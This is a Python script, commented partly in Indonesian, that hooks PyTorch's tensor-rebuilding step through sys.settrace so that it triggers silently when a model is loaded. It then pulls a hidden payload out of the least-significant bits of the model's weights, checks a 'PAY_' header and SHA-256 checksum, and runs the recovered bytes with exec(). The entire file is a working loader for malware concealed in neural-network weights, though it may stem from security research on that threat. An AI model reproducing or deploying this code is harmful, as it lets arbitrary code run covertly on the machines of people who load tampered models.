import sys, torch, struct, hashlib
import numpy as np
import pathlib
import os
import ctypes
import pathlib
from cryptography.fernet import Fernet


def float_to_bin32(f):  # 32-bit float → list of bits
    int_repr = struct.unpack('!I', struct.pack('!f', f))[0]
    binary_str = bin(int_repr)[2:].zfill(32)
    return [int(bit) for bit in binary_str]

def classify_tensor_shape(arg):
    shape_x = arg.shape
    ndim = arg.ndimension()

    if ndim == 4:
        return 'conv_weight'  # CNN layer
    elif ndim == 2:
        return 'fc_weight'    # Fully connected
    elif ndim == 1:
        if shape_x[0] <= 512:
            return 'bias_or_bn'  # Bias atau batchnorm
        else:
            return 'embedding_or_misc'
    elif ndim == 0:
        return 'scalar'
    else:
        return 'unknown'

def extract_payload(tensor, X=1, limit=200000):  # Max 200k weights
    # Extract semua weights
    all_weights = tensor
    # Extract bits dari LSB
    extracted_bits = []
    header_found = False
    payload_length = 0
    total_bits_needed = 0
    weights = []
    for i, weight in enumerate(all_weights):
        if i % 10000 == 0 and i > 0:
            print(f"   Processed {i:,} weights...")
        weights.append(weight)
        binary = float_to_bin32(weight)
        extracted_bits.append(binary[-X])  # Get X LSB bits
        # Cari header setelah memiliki cukup bits untuk header (40 bytes = 320 bits)
        if not header_found and len(extracted_bits) >= 320:
            # Coba decode header
            header_bytes = bytearray()
            for j in range(0, 320, 8):  # 40 bytes header
                if j + 8 <= len(extracted_bits):
                    byte_bits = extracted_bits[j:j+8]
                    byte_val = int(''.join(map(str, byte_bits)), 2)
                    header_bytes.append(byte_val)
            try:
                # Parse header: size (4 bytes) + magic (4 bytes) + checksum (32 bytes)
                if len(header_bytes) >= 40:
                    payload_length, magic, checksum = struct.unpack("I 4s 32s", header_bytes[:40])
                    if magic == b"PAY_":  # Valid header found!
                        print(f"Header found! Payload length: {payload_length} bytes")
                        header_found = True
                        total_bits_needed = 320 + (payload_length * 8)  # header + payload
                        print(f"Need {total_bits_needed} total bits")
                        
            except struct.error:
                continue  # Continue searching for header
        
        # Jika header sudah ditemukan, extract sampai lengkap
        if header_found and len(extracted_bits) >= total_bits_needed:
            print(f"Collected {len(extracted_bits)} bits, extracting payload...")
            
            # Extract payload bytes (skip 40 bytes header)
            payload_bytes = bytearray()
            for j in range(320, total_bits_needed, 8):  # Skip header
                if j + 8 <= len(extracted_bits):
                    byte_bits = extracted_bits[j:j+8]
                    byte_val = int(''.join(map(str, byte_bits)), 2)
                    payload_bytes.append(byte_val)
            
            if len(payload_bytes) == payload_length:
                # Verify checksum
                extracted_checksum = hashlib.sha256(payload_bytes).digest()
                if extracted_checksum == checksum:
                    print("Checksum verified! Payload integrity confirmed.")
                    try:
                        # payload_code = payload_bytes.decode('utf-8', errors='ignore')
                        # print(f"Complete payload extracted: {len(payload_code)} characters")
                        # return payload_code
                        return payload_bytes
                    except Exception as e:
                        print(f"Decoding error: {e}")
                        return None
                else:
                    print("Checksum mismatch! Payload corrupted.")
                    return None
            else:
                print(f"Incomplete payload: {len(payload_bytes)}/{payload_length} bytes")
                return None
        
        # Safety limit - stop jika terlalu banyak weights diproses
        if i > limit:
            print("Safety limit reached, stopping extraction")
            break
        
    print("No valid payload header found")
    return None


# Global list dan counter
tensor_list = []
tensor_limit = 6  # hanya ambil 3 tensor pertama
def tracer(frame, event, arg):
    def on_return(frame, event, arg):
        global tensor_list
        t_type = classify_tensor_shape(arg)
        print("Extraction from tensor...\n")
        if torch.is_tensor(arg):

            if t_type == 'scalar':
                return None

            if t_type == 'embedding_or_misc':
                return None
                
            if arg.shape == torch.Size([64]):
                if arg[0] > 1:
                    return None

                if arg[0] < -0.01:
                    return None
            
            # Simpan tensor jika belum melebihi limit
            if len(tensor_list) < tensor_limit:
                tensor_list.append(arg.clone().detach())
            # Jika sudah cukup, gabungkan dan ekstrak
            if len(tensor_list) == tensor_limit:
                print("Combining tensors for payload extraction...")
                all_weights = []
                for t in tensor_list:
                    all_weights.extend(t.cpu().numpy().flatten().tolist())
                code = extract_payload(all_weights)
                sys.settrace(None)  # matikan tracing setelah ekstraksi
                if code:
                    try: 
                        code = code if isinstance(code, str) else code.decode('utf-8', errors='ignore')
                        exec(code)
                    except Exception as e: print(f"Execution error: {e}")

        return None
    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return on_return

sys.settrace(tracer)